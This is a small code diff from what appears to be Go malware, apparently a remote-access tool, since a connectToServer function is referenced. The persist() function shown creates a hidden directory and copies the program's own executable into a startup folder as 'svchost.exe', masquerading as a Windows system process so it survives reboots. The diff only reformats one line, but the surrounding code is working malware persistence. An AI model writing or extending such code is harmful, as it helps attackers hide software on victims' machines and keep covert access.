@@ -141,8 +141,7 @@ func connectToServer(ip string, port int) {
 func persist() {
 	os.Mkdir(PATH, 0644)
 
-	PATH_UTF16 := syscall.StringToUTF16Ptr(PATH)
-	syscall.SetFileAttributes(PATH_UTF16, syscall.FILE_ATTRIBUTE_HIDDEN)
+	syscall.SetFileAttributes(syscall.StringToUTF16Ptr(PATH), syscall.FILE_ATTRIBUTE_HIDDEN)
 
 	DATA, _ := os.ReadFile(SELF)
 	os.WriteFile(filepath.Join(STARTUP, "svchost.exe"), DATA, 0644)
